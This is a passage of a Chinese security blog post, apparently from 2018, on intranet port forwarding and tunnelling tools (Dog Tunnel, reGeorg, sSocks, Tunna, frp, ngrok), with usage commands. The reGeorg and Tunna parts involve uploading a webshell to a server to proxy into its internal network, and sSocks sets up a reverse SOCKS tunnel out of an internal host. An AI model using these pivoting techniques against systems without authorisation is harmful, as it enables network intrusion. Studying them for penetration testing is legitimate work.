+<h3 id="（3）Dog-Tunnel"><a href="#（3）Dog-Tunnel" class="headerlink" title="（3）Dog Tunnel"></a>（3）Dog Tunnel</h3><ul>
+<li>Dog Tunnel是一款基于kcp的p2p端口映射工具，同时支持socks5代理。在KCP出现后进行了重构，将其底层UDP支持替换为了KCP，使其效率大大提高，在某些恶劣的网络环境下依旧能有不错的效果。当然，它也是支持TCP模式的，另外它也是支持加密的，在P2P打洞失败的情况下也能够自动切换为C/S模式来使用服务器中转。官方地址：<a href="https://github.com/vzex/dog-tunnel" target="_blank" rel="external">https://github.com/vzex/dog-tunnel</a></li>
+</ul>
+<h4 id="使用方法-1"><a href="#使用方法-1" class="headerlink" title="使用方法"></a>使用方法</h4><p><img src="/2018/08/28/内网端口转发及穿透/2.png" alt="结构图"></p>
+<ul>
+<li>dtunnel_s 为服务端 dtunnel 为客户端。远端是最终要连接的端口，通常是内网服务器，近端是本地需要连接的端口，通常是本地。</li>
+<li>dtunnel_s 启动时会监听一个tcp端口，通过-addr设置，如果需要-ssl(默认是false)，那么要指定-cert加载ssl证书，之后客户端连接也要打开-ssl开关(默认是true的) -addrudp 是p2p打洞的辅助udp端口，能提高打洞成功率,对应dtunnel参数-buster指定同样的ip和端口</li>
+<li>dtunnel_s 支持远程接口管理，如果需要，可通过-admin 指定ip:端口，比如-admin 127.0.0.1:1234</li>
+<li>使用方法：</li>
+<li><p>1.首先在公网服务器上面启动服务，监听端口：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> dtunnel_s -addr 0.0.0.0:8888 -ssl=<span class="literal">false</span></span></div></pre></td></tr></table></figure>
+</li>
+<li><p>服务端参数说明：</p>
+<ul>
+<li>-addr：服务端地址，默认是：0.0.0.0:8000</li>
+<li>-addrudp：UDP服务端地址，用于P2P辅助打洞，默认是：0.0.0.0:8018</li>
+<li>-admin：管理接口，用于提供API方便管理，如：0.0.0.0:1234</li>
+<li>-ssl：启用ssl支持，启用需要指定-cert和-cert参数，默认关闭，有bug，必须加上-ssl=false来关闭ssl</li>
+<li>-https：启用管理接口的HTTPS支持，需要指定-cert和-cert参数，默认关闭</li>
+<li>-cert：证书路径</li>
+<li>-key：证书密钥路径</li>
+<li>-dbhost：数据库服务器</li>
+<li>-dbpass：数据库密码</li>
+<li>-dbuser：数据库用户</li>
+<li>-replace：如果客户端注册名冲突，踢掉之前的，默认关闭</li>
+<li>-version：显示版本</li>
+</ul>
+</li>
+<li><p>2.远端客户端连接服务端：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ dtunnel -buster <span class="number">1.2</span><span class="meta">.3</span><span class="meta">.4</span>:<span class="number">8018</span> -remote <span class="number">1.2</span><span class="meta">.3</span><span class="meta">.4</span>:<span class="number">8888</span> -mode <span class="number">0</span> -reg redis -local :<span class="number">6379</span> -addip <span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span> -clientkey password -ssl=false</div><div class="line"># 如果需要开启SOCKS5服务，修改-local参数即可，近端无需修改</div><div class="line">$ dtunnel -buster <span class="number">1.2</span><span class="meta">.3</span><span class="meta">.4</span>:<span class="number">8018</span> -remote <span class="number">1.2</span><span class="meta">.3</span><span class="meta">.4</span>:<span class="number">8888</span> -mode <span class="number">0</span> -reg redis -local socks5 -addip <span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span> -clientkey password -ssl=false</div></pre></td></tr></table></figure>
+</li>
+<li><p>3.近端客户端了解客户端：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ dtunnel -buster <span class="number">1.2</span><span class="meta">.3</span><span class="meta">.4</span>:<span class="number">8018</span> -remote <span class="number">1.2</span><span class="meta">.3</span><span class="meta">.4</span>:<span class="number">8888</span> -mode <span class="number">0</span> -link redis -local :<span class="number">9999</span> -addip <span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span> -clientkey password -ssl=false -encrypt</div></pre></td></tr></table></figure>
+</li>
+<li><p>客户端参数说明：</p>
+<ul>
+<li>-addip：出口IP(单个或列表)，注意:对于多公网ip的终端，请用-stun参数指定stun服务器辅助连接，或者用-addip参数手工指定出口ip列表，默认是：127.0.0.1</li>
+<li>-remote：远程服务器，用于C/S模式，对应服务端-addr地址端口</li>
+<li>-buster：打洞服务器，用于P2P模式，对应服务端-addrudp端口地址</li>
+<li>-clientkey：客户端Key，用于远端和近端认证，需一致</li>
+<li>-reg：注册名，远端使用</li>
+<li>-link：连接的注册名，近端使用，用于识别连接远端</li>
+<li>-local：本地监听端口，填socks5则为socks5代理服务</li>
+<li>-encrypt：P2P模式加密，近端才能使用</li>
+<li>-mode：连接模式(0:P2P打洞失败后切换为C/S 1:只使用P2P 2:只使用C/S)</li>
+<li>-compress：压缩数据，远端和近端需一致</li>
+<li>-debug：调试模式</li>
+<li>-delay：打洞失败后重试延迟，秒</li>
+<li>-dnscache：DNS缓存有效期，如果大于0将定时清空DNS缓存，分钟</li>
+<li>-f：从文件中加载配置</li>
+<li>-kcp：kcp配置，远端和近端需一致</li>
+<li>-key：访问Key(服务端数据库中的AuthKey)</li>
+<li>-pipen：管道数</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><ul>
+<li>ds：数据纠错？仅在P2P模式有效，远端和近端需一致</li>
+<li>-ps：奇偶校验？仅在P2P模式有效，远端和近端需一致</li>
+<li>-ssl：启用ssl支持，默认启用，服务端没有启用的话请使用-ssl=false来关闭，有bug，必须加上-ssl=false来关闭ssl</li>
+<li>-v：输出详细日志</li>
+<li>-version：显示版本</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li>5.访问：访问近端（本地）9999端口即可连接到远端6379端口。或者通过本地9999端口连接SOCKS5服务器：<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> nc 127.0.0.1 9999</span></div><div class="line"><span class="meta">#</span><span class="bash"> 或者</span></div><div class="line"><span class="meta">$</span><span class="bash"> curl ip.cn -x socks5://127.0.0.1:9999</span></div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="（4）reGeorg"><a href="#（4）reGeorg" class="headerlink" title="（4）reGeorg"></a>（4）reGeorg</h3><ul>
+<li>reGeorg 是 reDuh 的升级版，主要是把内网服务器的端口通过 http/https 隧道转发到本机，形成一个回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口。它利用 webshell 建立一个 socks 代理进行内网穿透，服务器必须支持 aspx、php 或 jsp 这些 web 程序中的一种。官方地址：<a href="https://github.com/sensepost/reGeorg" target="_blank" rel="external">https://github.com/sensepost/reGeorg</a></li>
+</ul>
+<h4 id="使用方法-2"><a href="#使用方法-2" class="headerlink" title="使用方法"></a>使用方法</h4><ul>
+<li>1.将tunnel.(aspx|ashx|jsp|php)上传到服务器</li>
+<li><p>2.运行该来程序启动代理：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ python reGeorgSocksProxy<span class="selector-class">.py</span> -<span class="selector-tag">p</span> <span class="number">8080</span> -u http:<span class="comment">//upload.sensepost.net:8080/tunnel/tunnel.jsp</span></div></pre></td></tr></table></figure>
+</li>
+<li><p>3.使用SOCKS客户端连接使用IP:8080服务器。</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ curl ip<span class="selector-class">.cn</span> -x socks5:<span class="comment">//127.0.0.1:8080</span></div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="（5）sSocks"><a href="#（5）sSocks" class="headerlink" title="（5）sSocks"></a>（5）sSocks</h3><ul>
+<li>sSocks是一个socks代理工具套装，可用来开启socks代理服务，支持socks5验证，支持IPV6和UDP，并提供反向socks代理服务，即将远程计算机作为socks代理服务端，反弹回本地，极大方便内网的渗透测试。官方地址：<a href="http://sourceforge.net/projects/ssocks/" target="_blank" rel="external">http://sourceforge.net/projects/ssocks/</a></li>
+<li><p>下载解压后，执行命令编译</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./configure <span class="meta">&amp;&amp; make</span></div></pre></td></tr></table></figure>
+</li>
+<li><p>编译完成，进入src目录，会发现有nsocks、ssocksd、ssocks、rcsocks，其功能说明介绍如下：</p>
+<ul>
+<li>nsocks：类似通过Socks5代理后的netcat，可用来测试socks server</li>
+<li>ssocksd：用来开启Socks5代理服务</li>
+<li>ssocks：本地启用Socks5服务，并反弹到另一IP地址</li>
+<li>rcsocks：接收反弹过来的Socks5服务，并转向另一端口</li>
+</ul>
+</li>
+</ul>
+<h4 id="使用方法-3"><a href="#使用方法-3" class="headerlink" title="使用方法"></a>使用方法</h4><ul>
+<li><p>公网主机上执行：</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ rcsocks -l <span class="number">4444</span> -p <span class="number">5555</span> -vv</div></pre></td></tr></table></figure>
+</li>
+<li><p>内网主机上执行：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> rssocks –vv –s 公网主机ip:5555</span></div></pre></td></tr></table></figure>
+</li>
+<li><p>这时本地主机可以通过访问公网主机的 4444 端口访问内网主机：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ curl ip<span class="selector-class">.cn</span> -x socks5:<span class="comment">//公网IP:4444</span></div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="（6）Tunna"><a href="#（6）Tunna" class="headerlink" title="（6）Tunna"></a>（6）Tunna</h3><ul>
+<li>Tunna是一组通过HTTP包装的TCP隧道工具。 它可用于在完全防火墙环境中绕过网络限制。该工具使用的先决条件：能够在远程服务器上上传webshell。官方地址：<a href="https://github.com/SECFORCE/Tunna" target="_blank" rel="external">https://github.com/SECFORCE/Tunna</a></li>
+</ul>
+<h4 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h4><ul>
+<li>命令格式：<strong>python proxy.py -u remoteurl -l localport  [options]</strong></li>
+<li>常用参数：<ul>
+<li>–lport=LOCAL_PORT，-l：LOCAL_PORT代表本地侦听端口</li>
+<li>–verbose，-v：详细（输出数据包大小）</li>
+<li>–buffer=BUFFERSIZE，-b：BUFFERSIZE* HTTP请求大小（一些网站对大小有限制）</li>
+<li>–no-socks，-n：不使用 Socks 代理</li>
+<li>–rport=REMOTE_PORT，-r：REMOTE_PORT远程服务端口，供webshell连接</li>
+<li>–addr=REMOTE_IP，-a：REMOTE_IP 远程webshell连接到的地址（默认为 127.0.0.1）</li>
+<li>–up-proxy=UPPROXY，-x：UPPROXY上游代理（<a href="http://proxyserver.com:3128）" target="_blank" rel="external">http://proxyserver.com:3128）</a></li>
+<li>–auth，-A ：上游代理需要认证</li>
+<li>–ping-interval=PING_DELAY，-q：PING_DELAY webshprx pinging线程间隔（默认值为0.5）</li>
+<li>–start-ping，-s：首先启动ping线程 - 一些服务首先发送数据（例如，SSH）</li>
+<li>–cookie，-C：请求cookies</li>
+</ul>
+</li>
+<li>使用实例：<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> python proxy.py -u http://10.3.3.1/<span class="built_in">test</span>/conn.aspx -l 4444 -r 3389 -v</span></div><div class="line"><span class="meta">#</span><span class="bash"> 通过连接本地的4444端口转发到服务器的3389端口</span></div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="四、内网穿透"><a href="#四、内网穿透" class="headerlink" title="四、内网穿透"></a>四、内网穿透</h2><h3 id="（1）frp"><a href="#（1）frp" class="headerlink" title="（1）frp"></a>（1）frp</h3><ul>
+<li>frp 是一个可用于内网穿透的高性能的反向代理应用，支持 tcp, udp, http, https 协议。官方网站：<a href="https://github.com/fatedier/frp" target="_blank" rel="external">https://github.com/fatedier/frp</a></li>
+<li>frp 的作用：<ul>
+<li>利用处于内网或防火墙后的机器，对外网环境提供 http 或 https 服务。</li>
+<li>对于 http, https 服务支持基于域名的虚拟主机，支持自定义域名绑定，使多个域名可以共用一个80端口。</li>
+<li>利用处于内网或防火墙后的机器，对外网环境提供 tcp 和 udp 服务，例如在家里通过 ssh 访问处于公司内网环境内的主机。</li>
+</ul>
+</li>
+<li>具体使用方法见文档</li>
+</ul>
+<h3 id="（2）ngrok"><a href="#（2）ngrok" class="headerlink" title="（2）ngrok"></a>（2）ngrok</h3><ul>
+<li>一条命令即可穿透内网，将内网服务映射到公网URL上。官方地址：<a href="https://ngrok.com/" target="_blank" rel="external">https://ngrok.com/</a></li>
+</ul>
+<h4 id="使用方法-4"><a href="#使用方法-4" class="headerlink" title="使用方法"></a>使用方法</h4><ul>
+<li>命令格式：<strong>ngrok tunnel local_ports</strong></li>
+<li><p>将程序放到需要映射的主机，然后执行命令，如：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> ngrok http 80   <span class="comment"># 映射本地80端口的HTTP服务</span></span></div></pre></td></tr></table></figure>
+</li>
+<li><p>返回一个*.ngrok.io地址，访问改地址即可访问内网服务。</p>
+</li>
+<li>其他协议：<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> ngrok http foo.dev:80   <span class="comment"># 映射host:80隧道，而不是本地端口</span></span></div><div class="line"><span class="meta">$</span><span class="bash"> ng0rok tcp 22   <span class="comment"># 映射22端口的TCP隧道</span></span></div><div class="line"><span class="meta">$</span><span class="bash"> ngrok tls -hostname=foo.com 443  <span class="comment"># foo.com的TLS流量到443端口的隧道</span></span></div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="（3）其他内网穿透平台"><a href="#（3）其他内网穿透平台" class="headerlink" title="（3）其他内网穿透平台"></a>（3）其他内网穿透平台</h3><ul>
+<li><a href="https://natapp.cn/" target="_blank" rel="external">https://natapp.cn/</a></li>
+<li><a href="https://www.ngrok.cc/" target="_blank" rel="external">https://www.ngrok.cc/</a></li>
+</ul>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
+<li><a href="http://www.freebuf.com/articles/web/170970.html" target="_blank" rel="external">内网渗透之端口转发与代理工具总结</a></li>
+<li><a href="http://www.zerokeeper.com/experience/network-port-forwarding-and-penetration.html" target="_blank" rel="external">内网端口转发及穿透</a></li>
+<li><a href="http://www.senra.me/nat-traversal-series-dogtunnel-efficient-p2p-and-cs-tunnel-support-kcp/" target="_blank" rel="external">内网穿透系列——Dog Tunnel ( 狗洞，支持KCP，高效快速的P2P隧道 )</a></li>
+<li><a href="https://github.com/vzex/dog-tunnel" target="_blank" rel="external">官方文档</a></li>
+<li><a href="https://zhuanlan.zhihu.com/p/27501467" target="_blank" rel="external">知乎教程</a></li>
+</ul>
+</the></excerpt>
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2018/08/28/内网端口转发及穿透/">内网端口转发及穿透</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">HatBoy</a></p>
+        <p><span>发布时间:</span>2018-08-28, 09:42:53</p>
+        <p><span>最后更新:</span>2018-08-28, 09:50:41</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2018/08/28/内网端口转发及穿透/" title="内网端口转发及穿透">https://hatboy.github.io/2018/08/28/内网端口转发及穿透/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://hatboy.github.io/2018/08/28/内网端口转发及穿透/　　作者: HatBoy" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2018/04/28/Python编写socks5服务器/">
+                    Python编写socks5服务器
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#一、LCX"><span class="toc-number">1.</span> <span class="toc-text">一、LCX</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-lcx-内网端口转发（类似于SSH远程转发-R）"><span class="toc-number">1.1.</span> <span class="toc-text">1.lcx 内网端口转发（类似于SSH远程转发-R）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-本地端口转发（类似于SSH本地转发-L）"><span class="toc-number">1.2.</span> <span class="toc-text">2.本地端口转发（类似于SSH本地转发-L）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二、nc反弹"><span class="toc-number">2.</span> <span class="toc-text">二、nc反弹</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#正向连接"><span class="toc-number">2.1.</span> <span class="toc-text">正向连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#反向连接"><span class="toc-number">2.2.</span> <span class="toc-text">反向连接</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#三、socks代理工具"><span class="toc-number">3.</span> <span class="toc-text">三、socks代理工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#（1）Earthworm"><span class="toc-number">3.1.</span> <span class="toc-text">（1）Earthworm</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-正向SOCKS-v5服务器"><span class="toc-number">3.1.1.</span> <span class="toc-text">1.正向SOCKS v5服务器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-反弹SOCKS-v5服务器"><span class="toc-number">3.1.2.</span> <span class="toc-text">2.反弹SOCKS v5服务器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-多级级联"><span class="toc-number">3.1.3.</span> <span class="toc-text">3.多级级联</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#二级级联案例"><span class="toc-number">3.1.3.1.</span> <span class="toc-text">二级级联案例</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#三级级联案例"><span class="toc-number">3.1.3.2.</span> <span class="toc-text">三级级联案例</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-补充说明"><span class="toc-number">3.1.4.</span> <span class="toc-text">4.补充说明</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#（2）Termite"><span class="toc-number">3.2.</span> <span class="toc-text">（2）Termite</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#使用方法"><span class="toc-number">3.2.1.</span> <span class="toc-text">使用方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#（3）Dog-Tunnel"><span class="toc-number">3.3.</span> <span class="toc-text">（3）Dog Tunnel</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#使用方法-1"><span class="toc-number">3.3.1.</span> <span class="toc-text">使用方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#（4）reGeorg"><span class="toc-number">3.4.</span> <span class="toc-text">（4）reGeorg</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#使用方法-2"><span class="toc-number">3.4.1.</span> <span class="toc-text">使用方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#（5）sSocks"><span class="toc-number">3.5.</span> <span class="toc-text">（5）sSocks</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#使用方法-3"><span class="toc-number">3.5.1.</span> <span class="toc-text">使用方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#（6）Tunna"><span class="toc-number">3.6.</span> <span class="toc-text">（6）Tunna</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#使用方法："><span class="toc-number">3.6.1.</span> <span class="toc-text">使用方法：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#四、内网穿透"><span class="toc-number">4.</span> <span class="toc-text">四、内网穿透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#（1）frp"><span class="toc-number">4.1.</span> <span class="toc-text">（1）frp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#（2）ngrok"><span class="toc-number">4.2.</span> <span class="toc-text">（2）ngrok</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#使用方法-4"><span class="toc-number">4.2.1.</span> <span class="toc-text">使用方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#（3）其他内网穿透平台"><span class="toc-number">4.3.</span> <span class="toc-text">（3）其他内网穿透平台</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考文章"><span class="toc-number">5.</span> <span class="toc-text">参考文章</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"内网端口转发及穿透　| HatBoy的个人主页　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+        <section id="comments">
+    <style> aside.comment-bar { margin: auto 30px; }</style>
+    <div id="disqus_thread"></div>
+    <script>
+        var disqus_config = function(){
+            this.page.url = 'https://hatboy.github.io/2018/08/28/内网端口转发及穿透/';
+            this.page.identifier = '2018/08/28/内网端口转发及穿透/';
+        };
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = '//hatboy007.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        }
+    </script>
+    
+    <script> loadComment(); </script>
+
+</section>
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2018/04/28/Python编写socks5服务器/" title="下一篇: Python编写socks5服务器">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/08/28/内网端口转发及穿透/">内网端口转发及穿透</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/28/Python编写socks5服务器/">Python编写socks5服务器</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/19/Python沙箱逃逸总结/">Python沙箱逃逸总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/27/如何恢复丢失的Python源代码如果它还在内存中运行/">如何恢复丢失的Python源代码如果它还在内存中运行</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/08/pathlib：文件系统路径作为对象/">pathlib：文件系统路径作为对象</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/asyncio：异步IO、事件循环和并发/">asyncio：异步IO、事件循环和并发</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/asyncio之调试asyncio/">asyncio之调试asyncio</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/asyncio之协程结合线程和进程/">asyncio之协程结合线程和进程</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/asyncio之接收Unix信号/">asyncio之接收Unix信号</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/asyncio之使用子进程/">asyncio之使用子进程</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/asyncio之与DNS服务进行交互/">asyncio之与DNS服务进行交互</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/asyncio之使用SSL/">asyncio之使用SSL</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/asyncio之使用协程和流的异步I-O/">asyncio之使用协程和流的异步I/O</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/asyncio之协议抽象类的异步I-O/">asyncio之协议抽象类的异步I/O</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/asyncio之同步原语/">asyncio之同步原语</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/asyncio之用控制结构组建协程/">asyncio之用控制结构组建协程</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/asyncio之并发执行Tasks/">asyncio之并发执行Tasks</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/asyncio之异步生产结果/">asyncio之异步生产结果</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/asyncio之定时调度常规函数/">asyncio之定时调度常规函数</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/asyncio之使用协程处理多任务/">asyncio之使用协程处理多任务</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/asyncio之异步并发的概念/">asyncio之异步并发的概念</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/Python上下文管理器/">Python上下文管理器</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/Python-importlib讲解/">Python importlib讲解</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/第七章-用Cython包装C库/">第七章 用Cython包装C库</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/16/第六章-组织Cython代码/">第六章 组织Cython代码</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/10/第五章-Cython和扩展类型/">第五章 Cython和扩展类型</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/07/31/第四章-Cython实践：N-body模拟/">第四章 Cython实践：N-body模拟</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/07/31/Python性能分析与调试/">Python性能分析与调试</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/07/17/第三章-深入Cython/">第三章 深入Cython</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/07/03/第二章-编译和运行Cython代码/">第二章 编译和运行Cython代码</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/07/02/第一章-Cython简介/">第一章 Cython简介</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2017-2018 HatBoy
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+
+
+
+
+    <script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
